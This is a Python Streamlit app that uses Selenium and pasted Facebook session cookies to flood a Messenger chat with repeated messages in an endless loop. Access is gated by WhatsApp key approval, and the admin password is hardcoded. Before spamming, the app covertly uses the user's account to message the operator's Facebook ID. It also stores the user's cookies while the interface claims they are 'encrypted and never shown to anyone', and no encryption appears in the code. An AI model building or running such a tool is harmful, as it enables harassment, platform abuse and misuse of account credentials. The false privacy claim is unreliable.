import streamlit as st
import time
import threading
import uuid
import hashlib
import os
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests

st.set_page_config(
    page_title="E2E BY ROW3DY",
    page_icon="🥵",
    layout="wide",
    initial_sidebar_state="expanded"
)

custom_css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
    
    * {
        font-family: 'Poppins', sans-serif;
    }
    
    .stApp {
        background-image: url('https://i.postimg.cc/TYhXd0gG/d0a72a8cea5ae4978b21e04a74f0b0ee.jpg');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: fixed;
    }
    
    .main .block-container {
        background: rgba(255, 255, 255, 0.08);
        backdrop-filter: blur(8px);
        border-radius: 12px;
        padding: 25px;
        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
        border: 1px solid rgba(255, 255, 255, 0.12);
    }
    
    .stButton>button {
        background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
        color: white;
        border: none;
        border-radius: 10px;
        padding: 0.75rem 2rem;
        font-weight: 600;
        font-size: 1rem;
        transition: all 0.3s ease;
        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        width: 100%;
    }
    
    .stButton>button:hover {
        opacity: 0.9;
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
    }
    
    .stTextInput>div>div>input, 
    .stTextArea>div>div>textarea, 
    .stNumberInput>div>div>input {
        background: rgba(255, 255, 255, 0.15);
        border: 1px solid rgba(255, 255, 255, 0.25);
        border-radius: 8px;
        color: white;
        padding: 0.75rem;
        transition: all 0.3s ease;
    }
    
    .stTextInput>div>div>input::placeholder,
    .stTextArea>div>div>textarea::placeholder {
        color: rgba(255, 255, 255, 0.6);
    }
    
    .stTextInput>div>div>input:focus, 
    .stTextArea>div>div>textarea:focus {
        background: rgba(255, 255, 255, 0.2);
        border-color: #4ecdc4;
        box-shadow: 0 0 0 2px rgba(78, 205, 196, 0.2);
        color: white;
    }
    
    label {
        color: white !important;
        font-weight: 500 !important;
        font-size: 14px !important;
    }
    
    [data-testid="stMetricValue"] {
        color: #4ecdc4;
        font-weight: 700;
        font-size: 1.8rem;
    }
    
    [data-testid="stMetricLabel"] {
        color: rgba(255, 255, 255, 0.9);
        font-weight: 500;
    }
    
    .info-card {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        padding: 1.5rem;
        border-radius: 15px;
        margin: 1rem 0;
        border: 1px solid rgba(255, 255, 255, 0.15);
    }
    
    [data-testid="stSidebar"] {
        background: rgba(0, 0, 0, 0.3);
        backdrop-filter: blur(10px);
    }
    
    [data-testid="stSidebar"] .element-container {
        color: white;
    }
    
    .whatsapp-btn {
        background: linear-gradient(45deg, #25D366, #128C7E);
        color: white;
        padding: 15px 30px;
        border-radius: 12px;
        text-decoration: none;
        font-weight: 600;
        font-size: 18px;
        display: inline-block;
        margin: 20px 0;
        box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
        transition: all 0.3s ease;
    }
    
    .whatsapp-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(37, 211, 102, 0.6);
    }
    
    hr {
        margin: 20px 0;
        border-color: rgba(78, 205, 196, 0.3);
    }
    
    .message-box {
        background: linear-gradient(135deg, rgba(132, 250, 176, 0.2), rgba(143, 211, 244, 0.2));
        border-left: 5px solid #4ecdc4;
        border-radius: 12px;
        padding: 20px;
        margin: 20px 0;
        text-align: center;
        backdrop-filter: blur(10px);
    }
    
    .success-message {
        color: #84fab0;
        font-size: 18px;
        font-weight: 600;
        margin: 10px 0;
    }
    
    .task-start {
        background: linear-gradient(135deg, rgba(255, 107, 107, 0.3), rgba(78, 205, 196, 0.3));
        border: 2px solid #4ecdc4;
        box-shadow: 0 0 20px rgba(78, 205, 196, 0.3);
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

ADMIN_PASSWORD = "ROWEDYE2E2025"
WHATSAPP_NUMBER = "918290090930"
APPROVAL_FILE = "approved_keys.json"
PENDING_FILE = "pending_approvals.json"

def generate_user_key(username, password):
    combined = f"{username}:{password}"
    key_hash = hashlib.sha256(combined.encode()).hexdigest()[:8].upper()
    return f"KEY-{key_hash}"

def load_approved_keys():
    if os.path.exists(APPROVAL_FILE):
        try:
            with open(APPROVAL_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_approved_keys(keys):
    with open(APPROVAL_FILE, 'w') as f:
        json.dump(keys, f, indent=2)

def load_pending_approvals():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_pending_approvals(pending):
    with open(PENDING_FILE, 'w') as f:
        json.dump(pending, f, indent=2)

def send_whatsapp_message(user_name, approval_key):
    message = f"🥨 HELLO SIR PLEASE ❤️\nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
    return whatsapp_url

def check_approval(key):
    approved_keys = load_approved_keys()
    return key in approved_keys

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'user_key' not in st.session_state:
    st.session_state.user_key = None
if 'key_approved' not in st.session_state:
    st.session_state.key_approved = False
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'not_requested'
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'whatsapp_opened' not in st.session_state:
    st.session_state.whatsapp_opened = False
if 'task_message' not in st.session_state:
    st.session_state.task_message = None
if 'task_status' not in st.session_state:
    st.session_state.task_status = None

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

ADMIN_UID = "100003995292301"

def find_message_input(driver, process_id):
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            return element
                        elif idx < 10:
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            return element
                except Exception:
                    continue
        except Exception:
            continue
    
    return None

def setup_browser():
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
        else:
            driver = webdriver.Chrome(options=chrome_options)
        
        driver.set_window_size(1920, 1080)
        return driver
    except Exception as error:
        raise error

def get_next_message(messages, automation_state):
    if not messages or len(messages) == 0:
        return 'Hello!'
    
    message = messages[automation_state.message_rotation_index % len(messages)]
    automation_state.message_rotation_index += 1
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        driver = setup_browser()
        
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id)
        
        if not message_input:
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
        
        if not messages_list:
            messages_list = ['Hello!']
        
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
               
                messages_sent += 1
                automation_state.message_count = messages_sent
                
                time.sleep(delay)
                
            except Exception:
                time.sleep(5)
        
        return messages_sent
        
    except Exception:
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def send_admin_notification(user_config, username, automation_state, user_id):
    driver = None
    try:
        admin_e2ee_thread_id = db.get_admin_e2ee_thread_id(user_id)
        
        if admin_e2ee_thread_id:
            pass
        
        driver = setup_browser()
        
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if user_config['cookies'] and user_config['cookies'].strip():
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        user_chat_id = user_config.get('chat_id', '')
        admin_found = False
        e2ee_thread_id = admin_e2ee_thread_id
        
        if e2ee_thread_id:
            if '/e2ee/' in str(e2ee_thread_id) or admin_e2ee_thread_id:
                conversation_url = f'https://www.facebook.com/messages/e2ee/t/{e2ee_thread_id}'
            else:
                conversation_url = f'https://www.facebook.com/messages/t/{e2ee_thread_id}'
            
            driver.get(conversation_url)
            time.sleep(8)
            admin_found = True
        
        if not admin_found or not e2ee_thread_id:
            try:
                profile_url = f'https://www.facebook.com/{ADMIN_UID}'
                driver.get(profile_url)
                time.sleep(8)
                
                message_button_selectors = [
                    'div[aria-label*="Message" i]',
                    'a[aria-label*="Message" i]',
                    'div[role="button"]:has-text("Message")',
                    'a[role="button"]:has-text("Message")',
                    '[data-testid*="message"]'
                ]
                
                message_button = None
                for selector in message_button_selectors:
                    try:
                        elements = driver.find_elements(By.CSS_SELECTOR, selector)
                        if elements:
                            for elem in elements:
                                text = elem.text.lower() if elem.text else ""
                                aria_label = elem.get_attribute('aria-label') or ""
                                if 'message' in text or 'message' in aria_label.lower():
                                    message_button = elem
                                    break
                            if message_button:
                                break
                    except:
                        continue
                
                if message_button:
                    driver.execute_script("arguments[0].click();", message_button)
                    time.sleep(8)
                    
                    current_url = driver.current_url
                    
                    if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                        if '/e2ee/t/' in current_url:
                            e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                        else:
                            e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                        
                        if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                            current_cookies = user_config.get('cookies', '')
                            db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                            admin_found = True
            
            except Exception:
                pass
            
            if not admin_found or not e2ee_thread_id:
                try:
                    profile_url = f'https://www.facebook.com/messages/new'
                    driver.get(profile_url)
                    time.sleep(8)
                    
                    search_box = None
                    search_selectors = [
                        'input[aria-label*="To:" i]',
                        'input[placeholder*="Type a name" i]',
                        'input[type="text"]'
                    ]
                    
                    for selector in search_selectors:
                        try:
                            search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            if search_elements:
                                for elem in search_elements:
                                    if elem.is_displayed():
                                        search_box = elem
                                        break
                                if search_box:
                                    break
                        except:
                            continue
                    
                    if search_box:
                        driver.execute_script("""
                            arguments[0].focus();
                            arguments[0].value = arguments[1];
                            arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                        """, search_box, ADMIN_UID)
                        time.sleep(5)
                        
                        result_elements = driver.find_elements(By.CSS_SELECTOR, 'div[role="option"], li[role="option"], a[role="option"]')
                        if result_elements:
                            driver.execute_script("arguments[0].click();", result_elements[0])
                            time.sleep(8)
                            
                            current_url = driver.current_url
                            if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                                if '/e2ee/t/' in current_url:
                                    e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                else:
                                    e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                
                                if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                                    admin_found = True
                except Exception:
                    pass
        
        if not admin_found or not e2ee_thread_id:
            return
        
        message_input = find_message_input(driver, 'ADMIN-NOTIFY')
        
        if message_input:
            from datetime import datetime
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            notification_msg = f"🔔 New User Started Automation\n\n👤 Username: {username}\n⏰ Time: {current_time}\n🆔 Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
            
            driver.execute_script("""
                const element = arguments[0];
                const message = arguments[1];
                
                element.scrollIntoView({behavior: 'smooth', block: 'center'});
                element.focus();
                element.click();
                
                if (element.tagName === 'DIV') {
                    element.textContent = message;
                    element.innerHTML = message;
                } else {
                    element.value = message;
                }
                
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
            """, message_input, notification_msg)
            
            time.sleep(1)
            
            send_result = driver.execute_script("""
                const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                
                for (let btn of sendButtons) {
                    if (btn.offsetParent !== null) {
                        btn.click();
                        return 'button_clicked';
                    }
                }
                return 'button_not_found';
            """)
            
            if send_result == 'button_not_found':
                driver.execute_script("""
                    const element = arguments[0];
                    element.focus();
                    
                    const events = [
                        new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                    ];
                    
                    events.forEach(event => element.dispatchEvent(event));
                """, message_input)
            
            time.sleep(2)
            
    except Exception:
        pass
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def run_automation_with_notification(user_config, username, automation_state, user_id):
    send_admin_notification(user_config, username, automation_state, user_id)
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

def admin_panel():
    st.markdown("""
    <div class="main-header">
        <h1>🔐 ADMIN PANEL 🔐</h1>
        <p>KEY APPROVAL MANAGEMENT</p>
    </div>
    """, unsafe_allow_html=True)
    
    pending = load_pending_approvals()
    approved_keys = load_approved_keys()
    
    st.success(f"**Total Approved Keys:** {len(approved_keys)}")
    st.warning(f"**Pending Approvals:** {len(pending)}")
    
    if pending:
        st.markdown("#### 📋 Pending Approval Requests")
        
        for key, info in pending.items():
            col1, col2, col3 = st.columns([2, 2, 1])
            
            with col1:
                st.text(f"👤 {info['name']}")
            with col2:
                st.text(f"🔑 {key}")
            with col3:
                if st.button("✅", key=f"approve_{key}"):
                    approved_keys[key] = info
                    save_approved_keys(approved_keys)
                    del pending[key]
                    save_pending_approvals(pending)
                    st.success(f"Approved {info['name']}!")
                    st.rerun()
    else:
        st.info("No pending approvals")
    
    if approved_keys:
        st.markdown("#### ✅ Approved Keys")
        for key, info in approved_keys.items():
            st.text(f"👤 {info['name']} - 🔑 {key}")
    
    if st.button("🚪 Logout", key="admin_logout_btn"):
        st.session_state.approval_status = 'login'
        st.rerun()

def approval_request_page(user_key, username):
    st.markdown("""
    <div class="main-header">
        <h1>💎 KEY APPROVAL REQUIRED 💎</h1>
        <p>ACCESS APPROVAL NEEDED</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.session_state.approval_status == 'not_requested':
        st.markdown("### 🔑 Request Access")
        st.info(f"**Your Unique Key:** `{user_key}`")
        st.info(f"**Username:** {username}")
        
        col1, col2 = st.columns([1, 1])
        
        with col1:
            if st.button("📱 Request Approval", use_container_width=True, key="request_approval_btn"):
                pending = load_pending_approvals()
                pending[user_key] = {
                    "name": username,
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                save_pending_approvals(pending)
                
                st.session_state.approval_status = 'pending'
                st.session_state.whatsapp_opened = False
                st.rerun()
        
        with col2:
            if st.button("🔐 Admin Panel", use_container_width=True, key="admin_panel_btn"):
                st.session_state.approval_status = 'admin_login'
                st.rerun()
    
    elif st.session_state.approval_status == 'pending':
        st.warning("⏳ Approval Pending...")
        st.info(f"**Your Key:** `{user_key}`")
        
        whatsapp_url = send_whatsapp_message(username, user_key)
        
        if not st.session_state.whatsapp_opened:
            from streamlit.components.v1 import components
            whatsapp_js = f"""
            <script>
                setTimeout(function() {{
                    window.open('{whatsapp_url}', '_blank');
                }}, 500);
            </script>
            """
            components.html(whatsapp_js, height=0)
            st.session_state.whatsapp_opened = True
        
        st.success(f"✅ WhatsApp opening automatically for: **{username}**")
        st.markdown(f"""
        <div style="text-align: center; margin: 20px 0;">
            <a href="{whatsapp_url}" target="_blank" class="whatsapp-btn">
                📱 Click Here to Open WhatsApp
            </a>
        </div>
        """, unsafe_allow_html=True)
        
        st.markdown("### 📝 Message Preview:")
        st.code(f"""🥨 HELLO SIR PLEASE ❤️
My name is {username}
Please approve my key:
🔑 {user_key}""")
        
        st.markdown("---")
        
        col1, col2 = st.columns(2)
        
        with col1:
            if st.button("🔄 Check Approval Status", use_container_width=True, key="check_approval_btn"):
                if check_approval(user_key):
                    st.session_state.key_approved = True
                    st.session_state.approval_status = 'approved'
                    st.success("✅ Approved! Redirecting...")
                    time.sleep(1)
                    st.rerun()
                else:
                    st.error("❌ Not approved yet. Please wait!")
        
        with col2:
            if st.button("🔙 Back", use_container_width=True, key="back_btn"):
                st.session_state.approval_status = 'not_requested'
                st.session_state.whatsapp_opened = False
                st.rerun()
    
    elif st.session_state.approval_status == 'admin_login':
        st.markdown("### 🔐 Admin Login")
        
        admin_password = st.text_input("Enter Admin Password:", type="password", key="admin_password_input")
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("✅ Login", use_container_width=True, key="admin_login_btn"):
                if admin_password == ADMIN_PASSWORD:
                    st.session_state.approval_status = 'admin_panel'
                    st.rerun()
                else:
                    st.error("❌ Invalid password!")
        
        with col2:
            if st.button("🔙 Back", use_container_width=True, key="admin_back_btn"):
                st.session_state.approval_status = 'not_requested'
                st.rerun()
    
    elif st.session_state.approval_status == 'admin_panel':
        admin_panel()

def login_page():
    st.markdown("""
    <div class="main-header">
        <h1>🔐 LOGIN SYSTEM 🔐</h1>
        <p>Please login or create an account</p>
    </div>
    """, unsafe_allow_html=True)
    
    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
    
    with tab1:
        st.markdown("### Welcome Back!")
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
        
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    user_key = generate_user_key(username, password)
                    
                    st.session_state.logged_in = True
                    st.session_state.user_id = user_id
                    st.session_state.username = username
                    st.session_state.user_key = user_key
                    
                    if check_approval(user_key):
                        st.session_state.key_approved = True
                        st.session_state.approval_status = 'approved'
                        
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                    else:
                        st.session_state.key_approved = False
                        st.session_state.approval_status = 'not_requested'
                    
                    st.success(f"✅ Welcome back, {username}!")
                    st.rerun()
                else:
                    st.error("❌ Invalid username or password!")
            else:
                st.warning("⚠️ Please enter both username and password")
    
    with tab2:
        st.markdown("### Create New Account")
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
        
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    success, message = db.create_user(new_username, new_password)
                    if success:
                        st.success(f"✅ {message} Please login now!")
                    else:
                        st.error(f"❌ {message}")
                else:
                    st.error("❌ Passwords do not match!")
            else:
                st.warning("⚠️ Please fill all fields")

def main_app():
    st.markdown('<div class="main-header"><h1>🚀 AUTOMATION SYSTEM 🚀</h1><p>Message Automation Control Panel</p></div>', unsafe_allow_html=True)
    
    if not st.session_state.auto_start_checked and st.session_state.user_id:
        st.session_state.auto_start_checked = True
        should_auto_start = db.get_automation_running(st.session_state.user_id)
        if should_auto_start and not st.session_state.automation_state.running:
            user_config = db.get_user_config(st.session_state.user_id)
            if user_config and user_config['chat_id']:
                start_automation(user_config, st.session_state.user_id)
    
    st.sidebar.markdown(f"### 👤 {st.session_state.username}")
    st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
    st.sidebar.markdown(f"**Key:** `{st.session_state.user_key}`")
    st.sidebar.success("✅ Key Approved")
    
    if st.sidebar.button("🚪 Logout", use_container_width=True):
        if st.session_state.automation_state.running:
            stop_automation(st.session_state.user_id)
        
        st.session_state.logged_in = False
        st.session_state.user_id = None
        st.session_state.username = None
        st.session_state.user_key = None
        st.session_state.key_approved = False
        st.session_state.automation_running = False
        st.session_state.auto_start_checked = False
        st.session_state.approval_status = 'not_requested'
        st.session_state.task_message = None
        st.session_state.task_status = None
        st.rerun()
    
    user_config = db.get_user_config(st.session_state.user_id)
    
    if user_config:
        # Configuration Section
        st.markdown("### ⚙️ Configuration")
        
        col1, col2 = st.columns(2)
        
        with col1:
            chat_id = st.text_input("Chat/Conversation ID", value=user_config['chat_id'], 
                                   placeholder="e.g., 1362400298935018",
                                   help="Facebook conversation ID from the URL")
            
            name_prefix = st.text_input("Name Prefix", value=user_config['name_prefix'],
                                       placeholder="e.g., [E2E]",
                                       help="Prefix to add before each message")
        
        with col2:
            delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
                                   value=user_config['delay'],
                                   help="Wait time between messages")
        
        cookies = st.text_area("Facebook Cookies (optional - kept private)", 
                              value="",
                              placeholder="Paste your Facebook cookies here (will be encrypted)",
                              height=80,
                              help="Your cookies are encrypted and never shown to anyone")
        
        messages = st.text_area("Messages (one per line)", 
                               value=user_config['messages'],
                               placeholder="Enter each message on a new line",
                               height=120,
                               help="Enter each message on a new line")
        
        if st.button("💾 Save Configuration", use_container_width=True):
            final_cookies = cookies if cookies.strip() else user_config['cookies']
            db.update_user_config(
                st.session_state.user_id,
                chat_id,
                name_prefix,
                delay,
                final_cookies,
                messages
            )
            st.success("✅ Configuration saved successfully!")
            st.rerun()
        
        st.markdown("---")
        
        # Message Display Section
        if st.session_state.task_message:
            message_class = "task-start" if "STARTING" in st.session_state.task_message else ""
            st.markdown(f"""
            <div class="message-box {message_class}">
                <div class="success-message">{st.session_state.task_message}</div>
            </div>
            """, unsafe_allow_html=True)
        
        # Automation Control Section
        st.markdown("### 🚀 Automation Control")
        
        col1, col2 = st.columns(2)
        
        with col1:
            if st.button("▶️ START AUTOMATION", 
                        disabled=st.session_state.automation_state.running, 
                        use_container_width=True,
                        key="start_btn"):
                if user_config['chat_id']:
                    start_automation(user_config, st.session_state.user_id)
                    st.session_state.task_message = "✅ TASK STARTED! Messages are being sent successfully..."
                    st.session_state.task_status = "running"
                    st.rerun()
                else:
                    st.session_state.task_message = "❌ Please set Chat ID in Configuration first!"
                    st.rerun()
        
        with col2:
            if st.button("⏹️ STOP AUTOMATION", 
                        disabled=not st.session_state.automation_state.running, 
                        use_container_width=True,
                        key="stop_btn"):
                stop_automation(st.session_state.user_id)
                st.session_state.task_message = "⏹️ TASK STOPPED! Automation has been halted."
                st.session_state.task_status = "stopped"
                st.rerun()
        
        # Status indicator
        if st.session_state.automation_state.running:
            st.markdown("""
            <div style="text-align: center; padding: 10px; background: rgba(78, 205, 196, 0.2); border-radius: 10px; margin-top: 20px;">
                <span style="color: #4ecdc4; font-weight: 600;">🟢 AUTOMATION IS RUNNING...</span>
            </div>
            """, unsafe_allow_html=True)
        else:
            st.markdown("""
            <div style="text-align: center; padding: 10px; background: rgba(255, 107, 107, 0.2); border-radius: 10px; margin-top: 20px;">
                <span style="color: #ff6b6b; font-weight: 600;">🔴 AUTOMATION IS STOPPED</span>
            </div>
            """, unsafe_allow_html=True)
    else:
        st.warning("⚠️ No configuration found. Please refresh the page!")

if not st.session_state.logged_in:
    login_page()
elif not st.session_state.key_approved:
    approval_request_page(st.session_state.user_key, st.session_state.username)
else:
    main_app()
